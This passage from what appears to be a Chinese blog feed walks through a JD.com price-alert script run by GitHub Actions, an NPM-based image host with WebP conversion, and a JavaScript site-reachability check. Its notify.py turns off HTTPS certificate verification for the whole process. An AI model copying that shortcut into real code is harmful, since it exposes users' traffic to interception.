class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span 